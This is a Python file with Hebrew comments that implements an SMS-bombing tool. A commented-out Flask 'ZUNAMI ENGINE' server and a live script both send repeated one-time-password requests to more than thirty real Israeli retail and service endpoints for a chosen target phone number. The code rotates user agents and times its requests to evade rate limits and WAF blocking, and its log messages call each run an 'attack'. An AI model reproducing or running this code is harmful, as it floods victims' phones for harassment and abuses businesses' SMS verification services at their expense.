
# import concurrent.futures
# import requests
# import random
# import time
# import os
# from datetime import datetime
# from flask import Flask, jsonify, request
# from flask_cors import CORS

# # --- הגדרות צבעים לטרמינל ---
# class Colors:
#     GREEN = '\033[92m'
#     YELLOW = '\033[93m'
#     RED = '\033[91m'
#     CYAN = '\033[96m'
#     BOLD = '\033[1m'
#     RESET = '\033[0m'

# app = Flask(__name__)
# CORS(app) # מאפשר ל-Lovable לתקשר עם השרת

# # --- הגדרות מערכת ---
# BURST_PER_SITE = 10  # כמות סמסים מכל אתר
# is_attacking = False # דגל שליטה (Kill Switch)

# # --- רשימת אתרים מעודכנת (טרף קל) ---
# SITES = [
#     {"name": "Naot",       "url": "https://www.tevanaot.co.il/apps/api/otp/request", "type": "json", "body": {"phoneNumber": "{phone}"}},
#     {"name": "CrazyLine",  "url": "https://www.crazyline.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "Housemen",   "url": "https://housemen.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=simply-check-member-cellphone&cellphone={phone}"},
#     {"name": "Spices",     "url": "https://www.spicesonline.co.il/wp-admin/admin-ajax.php", "type": "form", "body": "action=validate_user_by_sms&phone={phone}"},
#     {"name": "Urbanica",   "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "form", "body": "form_key=dummy&bot_validation=1&type=login&telephone={phone}"},
#     {"name": "Femina",     "url": "https://femina.co.il/apps/feminaapp/auth/send-code", "type": "json", "body": {"phone": "{phone}"}},
#     {"name": "Paneco",     "url": "https://www.paneco.co.il/customer/account/loginPost/", "type": "form", "body": "login[username]={phone}"},
# ]

# def get_dynamic_headers(site_url):
#     """מייצר זהות דפדפן ייחודית לכל בקשה"""
#     user_agents = [
#         "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
#         "Mozilla/5.0 (Linux; Android 14; SM-S921B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
#         "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
#         "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
#     ]
    
#     base_domain = site_url.rsplit('/', 3)[0]
#     return {
#         "User-Agent": random.choice(user_agents),
#         "Accept": "application/json, text/plain, */*",
#         "Accept-Language": "he-IL,he;q=0.9,en-US;q=0.8",
#         "X-Requested-With": "XMLHttpRequest",
#         "Origin": base_domain,
#         "Referer": base_domain + "/",
#         "Cache-Control": "no-cache"
#     }

# def log(msg, color=Colors.RESET):
#     ts = datetime.now().strftime("%H:%M:%S")
#     print(f"{color}[{ts}] {msg}{Colors.RESET}")

# def execute_ultra_burst(site, phone):
#     """מנגנון השליחה המתוחכם לכל אתר"""
#     global is_attacking
#     success_count = 0
#     session = requests.Session() # שימוש ב-Session לכל אתר לשמירת Cookies
    
#     for i in range(BURST_PER_SITE):
#         if not is_attacking:
#             log(f"🛑 Stopping burst for {site['name']}...", Colors.YELLOW)
#             break
            
#         try:
#             headers = get_dynamic_headers(site["url"])
            
#             if site["type"] == "json":
#                 headers["Content-Type"] = "application/json"
#                 payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v for k, v in site["body"].items()}
#                 resp = session.post(site["url"], json=payload, headers=headers, timeout=10)
#             else:
#                 headers["Content-Type"] = "application/x-www-form-urlencoded"
#                 payload = site["body"].replace("{phone}", phone)
#                 resp = session.post(site["url"], data=payload, headers=headers, timeout=10)

#             if resp.status_code in (200, 201, 202, 204):
#                 success_count += 1
#                 log(f"🔥 {site['name']:12} | SMS {i+1}/{BURST_PER_SITE} SENT", Colors.GREEN)
#             else:
#                 log(f"⚠️ {site['name']:12} | SMS {i+1} BLOCKED ({resp.status_code})", Colors.YELLOW)
#                 if resp.status_code == 429: # Rate Limit
#                     time.sleep(3) 

#             # השהיית מיקרו חכמה לעקיפת WAF
#             time.sleep(random.uniform(1.2, 1.9))

#         except Exception as e:
#             log(f"❌ {site['name']:12} | Error: {str(e)[:30]}", Colors.RED)
#             time.sleep(2)
            
#     return success_count

# # --- API Endpoints ---

# @app.route('/stop', methods=['POST'])
# def stop():
#     global is_attacking
#     is_attacking = False
#     log("!!! EMERGENCY STOP TRIGGERED BY USER !!!", Colors.RED)
#     return jsonify({"status": "stopped", "message": "Attack termination signal sent"})

# @app.route('/launch', methods=['POST'])
# def launch():
#     global is_attacking
#     data = request.get_json() or {}
#     phone = data.get('phone')

#     if not phone:
#         return jsonify({"error": "No phone number provided"}), 400

#     is_attacking = True
#     total_sites = len(SITES)
#     expected_sms = total_sites * BURST_PER_SITE

#     log(f"--- STARTING ULTRA BURST: {expected_sms} SMS ON {phone} ---", Colors.CYAN)

#     total_success = 0
#     # שימוש ב-4 עובדים כדי לא להציף את ה-CPU ולשמור על יציבות
#     with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
#         results = list(executor.map(lambda s: execute_ultra_burst(s, phone), SITES))
#         total_success = sum(results)

#     is_attacking = False
#     log(f"--- ATTACK COMPLETED: {total_success}/{expected_sms} SUCCESSFUL ---", Colors.CYAN)
    
#     return jsonify({
#         "status": "completed",
#         "phone": phone,
#         "sent": total_success,
#         "total_attempted": expected_sms
#     })

# if __name__ == '__main__':
#     # מותאם להרצה על Render או מקומית
#     port = int(os.environ.get("PORT", 5000))
#     log(f"ZUNAMI ENGINE v20 READY ON PORT {port}", Colors.BOLD + Colors.GREEN)
#     app.run(host='0.0.0.0', port=port, debug=False)


import requests
import time
import sys

def send_all_otps(phone_number):
    # בדיקת תקינות בסיסית למספר
    if not phone_number or len(phone_number) < 9:
        print("Error: Please provide a valid phone number.")
        return

    user_agent = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36'
    common_headers = {
        'User-Agent': user_agent,
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.9',
    }

    # רשימה מלאה ומאוחדת של כל האתרים (30+)
    targets = [
        # --- קבוצת אתרי Magento (Castro & Fox Group) ---
        {'name': 'Bath & Body Works', 'url': 'https://www.bathandbodyworks.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Castro', 'url': 'https://www.castro.com/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Delta', 'url': 'https://www.delta.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Carolina Lemke', 'url': 'https://www.carolinalemke.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Crazy Line', 'url': 'https://www.crazyline.com/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Golbary', 'url': 'https://www.golbary.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Golf & Co', 'url': 'https://www.golfco.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Intima', 'url': 'https://www.intima-il.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Noizz', 'url': 'https://www.noizz.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Sacara', 'url': 'https://www.sacara.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Urbanica', 'url': 'https://www.urbanica-wh.com/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Victoria Secret', 'url': 'https://www.victoriassecret.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Yves Rocher', 'url': 'https://www.yvesrocher.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Lighting', 'url': 'https://www.lighting.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Hoodies', 'url': 'https://www.hoodies.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Lilit Cosmet', 'url': 'https://www.lilit.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Mania Jeans', 'url': 'https://www.maniajeans.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},
        {'name': 'Aeropostale', 'url': 'https://www.aeropostale.co.il/customer/account/sendOtp/', 'method': 'POST', 'data': {'mobile': phone_number}},

        # --- קבוצת Dream Card (דורש UUID ספציפי לכל מותג) ---
        {'name': 'Foot Locker', 'url': 'https://footlocker.co.il/apps/dream-card/otp/request', 'method': 'POST', 'json': {'phoneNumber': phone_number, 'uuid': 'd069072a-eca7-45a5-9d4d-a7b5719e7eba'}},
        {'name': 'Fox Home', 'url': 'https://www.foxhome.co.il/apps/dream-card/otp/request', 'method': 'POST', 'json': {'phoneNumber': phone_number, 'uuid': 'b663194f-2b2f-4000-bf78-ac2cb2289dc4'}},
        {'name': 'Laline', 'url': 'https://www.laline.co.il/apps/dream-card/otp/request', 'method': 'POST', 'json': {'phoneNumber': phone_number, 'uuid': '53d08816-cafd-416e-8765-a801c05f7237'}},
        {'name': 'Itay Brands', 'url': 'https://itaybrands.co.il/apps/dream-card/otp/request', 'method': 'POST', 'json': {'phoneNumber': phone_number, 'uuid': '046406c3-e7dd-4236-9728-d18a196c00e4'}},
        {'name': 'Naot', 'url': 'https://www.tevanaot.co.il/apps/api/otp/request', 'method': 'POST', 'json': {'phoneNumber': phone_number}},

        # --- שירותים, אפליקציות ו-AJAX ---
        {'name': 'Zygo', 'url': 'https://api.zygo.co.il/v2/auth/create-verify-token', 'method': 'POST', 'json': {'phone': phone_number, 'channel': 'sms'}},
        {'name': 'Hamal', 'url': 'https://api.hamal.co.il/v1/users/validate', 'method': 'POST', 'json': {'value': phone_number, 'type': 'phone'}},
        {'name': 'Noy Hasade', 'url': 'https://api.noyhasade.co.il/v1/auth/request-otp', 'method': 'POST', 'json': {'phone': phone_number, 'email': False, 'ip': None}},
        {'name': 'Mishloha', 'url': 'https://webapi.mishloha.co.il/api/v1/otp/send', 'method': 'POST', 'json': {'phone': phone_number}},
        {'name': 'Electra', 'url': 'https://www.electra-air.co.il/wp-admin/admin-ajax.php', 'method': 'POST', 'data': {'action': 'send_otp', 'phone': phone_number}},
        {'name': 'Spices', 'url': 'https://www.spicesonline.co.il/wp-admin/admin-ajax.php', 'method': 'POST', 'data': {'action': 'validate_user_by_sms', 'phone': phone_number}},
        {'name': 'Housemen', 'url': 'https://housemen.co.il/wp-admin/admin-ajax.php', 'method': 'POST', 'data': {'action': 'simply-check-member-cellphone', 'cellphone': phone_number}},
        {'name': 'Joe Delek', 'url': 'https://www.joedelek.co.il/loginpage', 'method': 'GET', 'params': {'action': 'joegetcode', 'phone': phone_number}},
        {'name': 'Tiv Taam', 'url': 'https://www.tivtaam.co.il/api/v1/auth/otp', 'method': 'POST', 'json': {'phone': phone_number}}
    ]

    print(f"[*] Starting process for target: {phone_number}")
    session = requests.Session()

    for i, target in enumerate(targets, 1):
        try:
            headers = common_headers.copy()
            if target['method'] == 'POST':
                if 'json' in target:
                    resp = session.post(target['url'], json=target['json'], headers=headers, timeout=10)
                else:
                    resp = session.post(target['url'], data=target['data'], headers=headers, timeout=10)
            else:
                resp = session.get(target['url'], params=target.get('params'), headers=headers, timeout=10)
            
            print(f"[{i}/{len(targets)}] {target['name']}: {resp.status_code}")
        except Exception as e:
            print(f"[{i}/{len(targets)}] {target['name']}: Error -> {str(e)}")
        
        # השהייה קלה למניעת חסימת IP
        time.sleep(0.2)

if __name__ == "__main__":
    # אם המשתמש הזין מספר בשורת הפקודה, נשתמש בו. אחרת, נבקש קלט.
    if len(sys.argv) > 1:
        target_phone = sys.argv[1]
    else:
        target_phone = input("Enter target phone number: ")

    send_all_otps(target_phone)